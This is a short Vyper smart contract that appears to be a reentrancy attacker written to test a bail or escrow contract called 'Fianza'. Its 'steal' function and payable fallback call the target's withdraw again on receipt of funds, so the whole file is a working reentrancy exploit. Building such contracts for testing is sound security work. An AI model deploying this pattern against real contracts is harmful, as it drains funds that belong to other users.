# pragma version ~=0.4.3

interface Fianza:
    def fund(lid: uint256): payable
    def withdraw(): nonpayable
    def accept(lid: uint256): nonpayable

target: public(Fianza)
hits: public(uint256)


@deploy
def __init__(target: address):
    self.target = Fianza(target)


@external
@payable
def fund(lid: uint256):
    extcall self.target.fund(lid, value=msg.value)


@external
def accept(lid: uint256):
    extcall self.target.accept(lid)


@external
def steal():
    extcall self.target.withdraw()


@external
@payable
def __default__():
    self.hits += 1
    if self.hits < 3:
        extcall self.target.withdraw()
